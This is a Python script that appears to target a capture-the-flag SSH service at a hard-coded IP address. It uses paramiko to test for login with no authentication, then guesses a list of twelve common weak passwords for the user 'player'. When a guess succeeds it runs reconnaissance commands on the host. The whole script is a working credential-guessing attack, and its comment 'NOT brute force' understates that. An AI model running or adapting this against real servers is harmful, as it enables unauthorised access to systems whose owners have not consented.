import socket, paramiko
HOST="13.37.197.230"; PORT=28491; USER="player"

# 1) banner + allowed auth methods via auth_none
t=paramiko.Transport((HOST,PORT)); t.start_client(timeout=15)
print("SSH banner:", t.remote_version)
try:
    t.auth_none(USER)
    print("auth_none -> SUCCESS (no auth!)")
except paramiko.BadAuthenticationType as e:
    print("allowed auth methods:", e.allowed_types)
except Exception as e:
    print("auth_none err:", type(e).__name__, e)
t.close()

# 2) try a short list of weak passwords (NOT brute force)
pwlist=["player","","password","citadel","toor","root","12345","nctf","throne","changeme","player123","admin"]
for pw in pwlist:
    c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST,port=PORT,username=USER,password=pw,timeout=12,
                  look_for_keys=False,allow_agent=False,banner_timeout=15,auth_timeout=12)
        print(f"[+] PASSWORD FOUND: player:{pw!r}")
        i,o,e=c.exec_command("id; hostname; ls -la; pwd")
        print(o.read().decode(errors='replace'))
        c.close(); break
    except paramiko.AuthenticationException:
        print(f"[-] player:{pw!r} bad")
    except Exception as e:
        print(f"[!] player:{pw!r} err {type(e).__name__}: {e}")
    finally:
        try: c.close()
        except: pass
